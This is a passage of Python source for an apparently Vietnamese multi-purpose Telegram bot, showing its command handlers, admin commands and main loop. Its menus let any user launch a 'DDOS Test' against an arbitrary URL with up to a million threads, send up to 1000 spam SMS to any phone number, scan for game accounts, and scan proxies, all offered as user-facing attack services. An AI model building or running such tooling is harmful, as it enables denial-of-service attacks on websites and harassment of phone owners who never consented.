async def cmd_startbot(update, context):
    if not is_owner(update.effective_user.id): await update.message.reply_text("❌"); return
    user_data_store["bot_enabled"] = True; save_all_data()
    for k in user_data_store:
        if k in ("owner","blacklist","bot_enabled"): continue
        try: await context.bot.send_message(int(k), "✅ Bot đã bật lại.")
        except: pass
    await update.message.reply_text("✅ Bot đã bật lại.")

# ========== LỆNH SHORTCUT (không cần nút) ==========
async def cmd_proxy(update, context):
    await update.message.reply_text("🌐 Scan Proxy", reply_markup=proxy_menu_keyboard())

async def cmd_xworld(update, context):
    await update.message.reply_text("🎯 Canh Code XWorld", reply_markup=xworld_menu_keyboard())

async def cmd_game(update, context):
    uid = update.effective_user.id
    mk, tx = game_menu_keyboard(uid)
    await update.message.reply_text(tx, parse_mode='Markdown', reply_markup=mk)

async def cmd_ddos(update, context):
    await update.message.reply_text("💣 DDOS Test", reply_markup=ddos_menu_keyboard())

async def cmd_scanlq(update, context):
    await update.message.reply_text("🎮 Scan Acc LQ", reply_markup=scan_lq_menu_keyboard())

async def cmd_spam(update, context):
    await update.message.reply_text("📧 Spam SMS", reply_markup=spam_menu_keyboard())

# ========== /top ==========
async def cmd_top(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not check_antispam(user_id):
        return
    today = date.today().isoformat()
    last_reset = user_data_store.get("top_reset_date", "2000-01-01")
    need_reset = False
    try:
        last = date.fromisoformat(last_reset)
        if (date.today() - last).days >= 7:
            need_reset = True
    except:
        need_reset = True

    if need_reset:
        users = []
        for uid_str, data in user_data_store.items():
            if uid_str in ("owner", "blacklist", "bot_enabled", "top_reset_date"): continue
            try:
                uid = int(uid_str)
                bal = data.get("game", {}).get("balance", 0)
                users.append((uid, bal))
            except:
                pass
        users.sort(key=lambda x: x[1], reverse=True)
        top_old = users[:3]
        rewards = {1: 2_000_000_000, 2: 1_000_000_000, 3: 500_000_000}
        for i, (uid, bal) in enumerate(top_old, start=1):
            game = get_user_game_data(uid)
            game["balance"] += rewards.get(i, 0)
        for uid_str, data in user_data_store.items():
            if uid_str in ("owner", "blacklist", "bot_enabled", "top_reset_date"): continue
            game = data.get("game")
            if game:
                game["balance"] = 0
        user_data_store["top_reset_date"] = today
        await update.message.reply_text("🔄 Đã reset bảng xếp hạng và trao thưởng cho top 3 tuần trước!")
        save_all_data()

    users = []
    for uid_str, data in user_data_store.items():
        if uid_str in ("owner", "blacklist", "bot_enabled", "top_reset_date"): continue
        try:
            uid = int(uid_str)
            bal = data.get("game", {}).get("balance", 0)
            users.append((uid, bal))
        except:
            pass
    users.sort(key=lambda x: x[1], reverse=True)
    top20 = users[:20]
    text_lines = ["🏆 *Top 20 người giàu nhất:*\n"]
    for i, (uid, bal) in enumerate(top20, start=1):
        profile = user_data_store.get(str(uid), {}).get("profile", {})
        uname = profile.get("username", str(uid))
        text_lines.append(f"{i}. `{uname}` - {format_money(bal)}")
    if not top20:
        text_lines.append("Chưa có ai.")
    await update.message.reply_text("\n".join(text_lines), parse_mode="Markdown")

# ========== CALLBACK HANDLER ==========
async def button_callback(update, context):
    query = update.callback_query; await query.answer()
    uid = update.effective_user.id; update_user_profile(uid, update)
    if not is_bot_enabled() and not is_owner(uid): await query.edit_message_text("⚠️ Bot đang tạm dừng."); return
    if not check_antispam(uid): return
    data = query.data; rt = get_user_runtime(uid)

    if data == "main_menu": await query.edit_message_text("🏠 Menu", reply_markup=main_menu_keyboard())
    elif data == "menu_proxy": await query.edit_message_text("🌐 Proxy", reply_markup=proxy_menu_keyboard())
    elif data == "menu_xworld": await query.edit_message_text("🎯 XWorld", reply_markup=xworld_menu_keyboard())
    elif data == "game_menu": mk,tx = game_menu_keyboard(uid); await query.edit_message_text(tx, parse_mode='Markdown', reply_markup=mk)
    elif data == "menu_ddos": await query.edit_message_text("💣 DDOS", reply_markup=ddos_menu_keyboard())
    elif data == "menu_scanlq": await query.edit_message_text("🎮 Scan LQ", reply_markup=scan_lq_menu_keyboard())
    elif data == "menu_spam": await query.edit_message_text("📧 Spam SMS", reply_markup=spam_menu_keyboard())

    # DDOS
    elif data == "ddos_start": await ddos_input_url(update, context)
    elif data == "ddos_stop":
        if uid in stress_tasks: stress_tasks[uid].set(); await query.edit_message_text("🛑 Đã dừng test.")
        else: await query.edit_message_text("ℹ️ Không có test.")

    # Scan LQ
    elif data == "scanlq_quantity":
        context.user_data["expect_scanlq"] = "quantity"; await query.edit_message_text("Nhập số lượng (1-10):")
    elif data == "scanlq_infinite":
        if uid in scan_lq_tasks: await query.edit_message_text("⚠️ Đang scan, hãy dừng trước.")
        else:
            asyncio.create_task(scan_lq_infinite(update.effective_chat.id, context))
            await query.edit_message_text("♾️ Đã bắt đầu scan liên tục!")
    elif data == "scanlq_stop":
        if uid in scan_lq_tasks: scan_lq_tasks[uid].set(); await query.edit_message_text("🛑 Đã dừng.")
        else: await query.edit_message_text("ℹ️ Không có scan.")

    # SPAM
    elif data == "spam_input":
        context.user_data["expect_spam"] = "phone"; await query.edit_message_text("Nhập SĐT (10 số, bắt đầu 0):")
    elif data == "spam_stop":
        if uid in spam_tasks: spam_tasks[uid].set(); await query.edit_message_text("🛑 Đã dừng spam.")
        else: await query.edit_message_text("ℹ️ Không có spam.")

    # PROXY
    elif data.startswith("proxy_"):
        act = data[6:]
        if act == "stop_scan": await proxy_stop_scan(update, uid); await query.edit_message_text("🛑 Đã dừng quét.")
        elif act in ("check_auto","check_long","start_scan"):
            if rt.get("proxy_task") and not rt["proxy_task"].done():
                await query.edit_message_text("⚠️ Scan proxy đang chạy."); return
            if act == "check_auto": await run_proxy_check(update, context, False)
            elif act == "check_long": await run_proxy_check(update, context, True)
            elif act == "start_scan": await run_proxy_check(update, context, False)
            await query.edit_message_text("⏳ Đã bắt đầu...")
        elif act == "check_file":
            context.user_data["waiting_proxy_file"] = True; await query.edit_message_text("📎 Gửi file .txt.")

    # XWORLD
    elif data.startswith("xw_"):
        act = data[3:]
        if act == "settings": await query.edit_message_text("⚙️ Cài đặt", reply_markup=xw_settings_keyboard())
        elif act == "add_account":
            context.user_data["expect_xw"] = "account_link"; await query.edit_message_text("Gửi link tài khoản.")
        elif act == "view_accounts":
            xd = get_user_xworld_data(uid)
            txt = "❌ Chưa có" if not xd["accounts"] else "📋 *TK:*\n"+"\n".join(f"{i+1}. `{a['user_id']}`" for i,a in enumerate(xd["accounts"]))
            await query.edit_message_text(txt, parse_mode='Markdown', reply_markup=xw_settings_keyboard())
        elif act == "set_threshold":
            context.user_data["expect_xw"] = "threshold"; await query.edit_message_text(f"Ngưỡng hiện tại: {get_user_xworld_data(uid)['threshold']}\nGửi số mới.")
        elif act == "add_code":
            context.user_data["expect_xw"] = "code"; await query.edit_message_text("Gửi code.")
        elif act == "start_monitor": await start_xworld_monitor(update, context)
        elif act == "stop_monitor": await stop_xworld_monitor(update, context)

    # GAME
    elif data == "game_setbet": await game_setbet_prompt(update, context)
    elif data == "game_input_bet": await game_input_bet(update, context)
    elif data == "game_allin": await game_allin(update, context)
    elif data == "game_tai": await play_tai_xiu(update, context, "tai")
    elif data == "game_xiu": await play_tai_xiu(update, context, "xiu")

# ========== TEXT HANDLER ==========
async def handle_text(update, context):
    uid = update.effective_user.id; update_user_profile(uid, update)
    if not is_bot_enabled() and not is_owner(uid): await update.message.reply_text("⚠️ Bot đang tạm dừng."); return
    if not check_antispam(uid): return
    if is_blacklisted(uid): return
    txt = update.message.text.strip()

    if "expect_ddos" in context.user_data:
        state = context.user_data["expect_ddos"]
        if state == 'url':
            if not is_valid_url(txt): await update.message.reply_text("❌ URL không hợp lệ."); return
            context.user_data.pop("expect_ddos"); await ddos_input_threads(update, context, txt)
        elif state == 'threads':
            try: th = int(txt); assert 1 <= th <= 1000000
            except: await update.message.reply_text("❌ 1-1,000,000"); return
            context.user_data.pop("expect_ddos"); await ddos_input_duration(update, context, th)
        elif state == 'duration':
            try: dur = int(txt); assert 1 <= dur <= 60
            except: await update.message.reply_text("❌ 1-60"); return
            url = context.user_data.get("ddos_url"); th = context.user_data.get("ddos_threads")
            context.user_data.pop("expect_ddos",None); context.user_data.pop("ddos_url",None); context.user_data.pop("ddos_threads",None)
            await run_stress_test(update, context, update.effective_chat.id, url, th, dur)
        return

    if "expect_scanlq" in context.user_data:
        try: qty = int(txt); assert 1 <= qty <= 10
        except: await update.message.reply_text("❌ 1-10"); return
        context.user_data.pop("expect_scanlq")
        asyncio.create_task(scan_lq_worker(update.effective_chat.id, qty, context))
        await update.message.reply_text(f"🚀 Bắt đầu scan {qty} tài khoản...")
        return

    if "expect_spam" in context.user_data:
        state = context.user_data["expect_spam"]
        if state == "phone":
            if not re.match(r"^0\d{9}$", txt): await update.message.reply_text("❌ SĐT không hợp lệ."); return
            context.user_data["spam_phone"] = txt; context.user_data["expect_spam"] = "count"
            await update.message.reply_text("Nhập số lần (1-1000):")
        elif state == "count":
            try: cnt = int(txt); assert 1 <= cnt <= 1000
            except: await update.message.reply_text("❌ 1-1000"); return
            phone = context.user_data.get("spam_phone")
            context.user_data.pop("expect_spam",None); context.user_data.pop("spam_phone",None)
            asyncio.create_task(spam_worker(update.effective_chat.id, phone, cnt, context))
            await update.message.reply_text(f"🚀 Bắt đầu spam {cnt} lần tới {phone}")
        return

    if "expect_game_bet" in context.user_data: await process_game_bet_amount(update, context); return

    if "expect_xw" in context.user_data:
        expect = context.user_data["expect_xw"]; data = get_user_xworld_data(uid)
        if expect == "account_link":
            u, k = parse_account_link(txt)
            if u and k:
                data["accounts"].append({"user_id":u,"secret_key":k}); data["claimed_history"].setdefault(u,[]); save_all_data()
                await update.message.reply_text(f"✅ Đã thêm `{u}`.", parse_mode='Markdown', reply_markup=xw_settings_keyboard())
            else: await update.message.reply_text("❌ Link lỗi.", reply_markup=xw_settings_keyboard())
            context.user_data.pop("expect_xw")
        elif expect == "threshold":
            try: v = int(txt); assert v > 0; data["threshold"] = v; save_all_data()
            except: await update.message.reply_text("❌ Số nguyên dương."); return
            await update.message.reply_text(f"✅ Ngưỡng mới: {v}", reply_markup=xw_settings_keyboard())
            context.user_data.pop("expect_xw")
        elif expect == "code":
            info = get_code_info(txt)
            if info["status"]:
                if not any(c["code"]==txt for c in data["codes"]):
                    data["codes"].append({"code":txt,"info":info}); save_all_data()
                    await update.message.reply_text(f"✅ Thêm code `{txt}` | Còn: {info['remaining']}/{info['total']}", reply_markup=xworld_menu_keyboard())
                else: await update.message.reply_text("⚠️ Đã có.", reply_markup=xworld_menu_keyboard())
            else: await update.message.reply_text(f"❌ Code lỗi: {info.get('message')}", reply_markup=xworld_menu_keyboard())
            context.user_data.pop("expect_xw")
        return

    await update.message.reply_text("Gõ /menu để xem danh sách lệnh.")

# ========== ADMIN COMMANDS ==========
async def cmd_broadcast(update, context):
    if not is_owner(update.effective_user.id): return
    if not context.args: await update.message.reply_text("/broadcast <msg>"); return
    msg = " ".join(context.args); sent = 0
    for k in user_data_store:
        if k in ("owner","blacklist","bot_enabled"): continue
        try: await context.bot.send_message(int(k), f"📢 {msg}"); sent += 1
        except: pass
    await update.message.reply_text(f"✅ Đã gửi đến {sent} người.")

async def cmd_ban(update, context):
    if not is_owner(update.effective_user.id): return
    if not context.args: return
    try: target = int(context.args[0])
    except: await update.message.reply_text("ID lỗi."); return
    if target == update.effective_user.id: await update.message.reply_text("Không thể tự ban."); return
    bl = user_data_store.setdefault("blacklist",[])
    if str(target) not in bl: bl.append(str(target)); save_all_data(); await update.message.reply_text(f"✅ Đã ban {target}.")
    else: await update.message.reply_text(f"ℹ️ Đã bị ban.")

async def cmd_unban(update, context):
    if not is_owner(update.effective_user.id): return
    if not context.args: return
    try: target = int(context.args[0])
    except: return
    bl = user_data_store.setdefault("blacklist",[])
    if str(target) in bl: bl.remove(str(target)); save_all_data(); await update.message.reply_text(f"✅ Đã bỏ ban {target}.")
    else: await update.message.reply_text(f"ℹ️ Không có trong blacklist.")

async def cmd_list_ids(update, context):
    if not is_owner(update.effective_user.id): return
    users = []; banned = []
    for k,v in user_data_store.items():
        if k in ("owner","blacklist","bot_enabled"): continue
        try: users.append(int(k))
        except: pass
    for b in user_data_store.get("blacklist",[]):
        try: banned.append(int(b))
        except: pass
    lines = []
    if users: lines.append(f"📋 Hoạt động ({len(users)}):"); lines.extend(f"• `{u}`" for u in sorted(users))
    if banned: lines.append(f"\n🚫 Bị ban ({len(banned)}):"); lines.extend(f"• `{b}`" for b in sorted(banned))
    if not lines: await update.message.reply_text("Chưa có ai."); return
    if len(users)+len(banned) <= 100: await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
    else:
        with tempfile.NamedTemporaryFile("w", delete=False, suffix=".txt", encoding="utf-8") as f:
            f.write("Danh sách ID\n"); f.write(f"-- Hoạt động ({len(users)}) --\n"); f.writelines(f"{u}\n" for u in sorted(users))
            if banned: f.write(f"\n-- Bị ban ({len(banned)}) --\n"); f.writelines(f"{b}\n" for b in sorted(banned))
            f_path = f.name
        await update.message.reply_document(open(f_path,"rb"), filename="ids.txt"); os.unlink(f_path)

async def cmd_whois(update, context):
    if not is_owner(update.effective_user.id): return
    if not context.args: return
    try: target = int(context.args[0])
    except: return
    p = user_data_store.get(str(target),{}).get("profile",{})
    if not p: await update.message.reply_text("❌ Không có dữ liệu."); return
    uname = f"@{p['username']}" if p.get("username") else "Không"
    full = f"{p.get('first_name','')} {p.get('last_name','')}".strip() or "Không"
    await update.message.reply_text(f"👤 *{target}*\n• Tên: {full}\n• Username: {uname}", parse_mode="Markdown")

async def cmd_channel(update, context):
    if not is_owner(update.effective_user.id): return
    if not context.args: return
    uname = context.args[0]
    if not uname.startswith("@"): uname = "@"+uname
    try:
        chat = await context.bot.get_chat(uname)
        members = "Không rõ"
        try: members = str(await chat.get_member_count())
        except: pass
        info = f"📺 {uname}\n• Tên: {chat.title}\n• Loại: {chat.type}"
        if chat.description: info += f"\n• Mô tả: {chat.description[:200]}"
        info += f"\n• Thành viên: {members}"
        await update.message.reply_text(info)
    except BadRequest as e: await update.message.reply_text(f"❌ {e.message}")

async def cmd_setowner(update, context):
    uid = update.effective_user.id
    owner = user_data_store.get("owner",0)
    if owner == 0 or owner == uid: user_data_store["owner"] = uid; save_all_data(); await update.message.reply_text(f"✅ Bạn (@{update.effective_user.username}) là chủ bot.")
    else: await update.message.reply_text("❌ Chủ bot đã được thiết lập.")

# ========== START / MENU (ĐÃ SỬA) ==========
async def start(update, context):
    uid = update.effective_user.id; update_user_profile(uid, update)
    if not is_bot_enabled() and not is_owner(uid): await update.message.reply_text("⚠️ Bot đang tạm dừng."); return
    if is_blacklisted(uid): return
    welcome = grant_welcome_bonus(uid); daily = grant_daily_bonus(uid)
    g = get_user_game_data(uid)
    msg = f"Chào mừng! ID: `{uid}`\n💰 Số dư: {format_money(g['balance'])}"
    if welcome: msg += "\n🎁 +10,000,000 VND thưởng lần đầu!"
    if daily: msg += "\n📅 +500,000 VND thưởng hàng ngày."
    msg += "\nGõ /menu để xem tất cả lệnh."
    await update.message.reply_text(msg, parse_mode='Markdown')

async def menu_command(update, context):
    uid = update.effective_user.id; update_user_profile(uid, update)
    if not is_bot_enabled() and not is_owner(uid): await update.message.reply_text("⚠️ Bot đang tạm dừng."); return
    if is_blacklisted(uid): return
    if not check_antispam(uid): return
    commands_text = (
        "📋 *Danh sách lệnh:*\n"
        "/start - Bắt đầu\n"
        "/menu - Xem danh sách lệnh\n"
        "/proxy - Scan Proxy\n"
        "/xworld - Canh Code XWorld\n"
        "/game - Trò chơi Tài Xỉu\n"
        "/ddos - DDOS Test\n"
        "/scanlq - Scan Acc LQ\n"
        "/spam - Spam SMS\n"
        "/top - Bảng xếp hạng người giàu\n"
        "/bank <id/@username> <số> - Chuyển tiền\n"
        "/vnd <id/@username> <số> - Admin tặng tiền\n"
        "/broadcast <msg> - Admin gửi thông báo\n"
        "/ban <id> - Admin ban\n"
        "/unban <id> - Admin unban\n"
        "/id - Admin xem danh sách ID\n"
        "/whois <id> - Admin xem thông tin người dùng\n"
        "/channel <@username> - Admin xem thông tin kênh\n"
        "/stopbot - Admin dừng bot\n"
        "/startbot - Admin khởi động lại bot\n"
        "/setowner - Thiết lập chủ bot"
    )
    await update.message.reply_text(commands_text, parse_mode="Markdown")

# ========== MAIN ==========
def main():
    load_all_data()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", menu_command))
    app.add_handler(CommandHandler("proxy", cmd_proxy))
    app.add_handler(CommandHandler("xworld", cmd_xworld))
    app.add_handler(CommandHandler("game", cmd_game))
    app.add_handler(CommandHandler("ddos", cmd_ddos))
    app.add_handler(CommandHandler("scanlq", cmd_scanlq))
    app.add_handler(CommandHandler("spam", cmd_spam))
    app.add_handler(CommandHandler("top", cmd_top))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("ban", cmd_ban))
    app.add_handler(CommandHandler("unban", cmd_unban))
    app.add_handler(CommandHandler("setowner", cmd_setowner))
    app.add_handler(CommandHandler("id", cmd_list_ids))
    app.add_handler(CommandHandler("whois", cmd_whois))
    app.add_handler(CommandHandler("channel", cmd_channel))
    app.add_handler(CommandHandler("bank", cmd_bank))
    app.add_handler(CommandHandler("vnd", cmd_vnd))
    app.add_handler(CommandHandler("stopbot", cmd_stopbot))
    app.add_handler(CommandHandler("startbot", cmd_startbot))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_proxy_file_upload))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    logger.info("Bot đa năng đang chạy...")
    app.run_polling()

if __name__ == "__main__":
    main()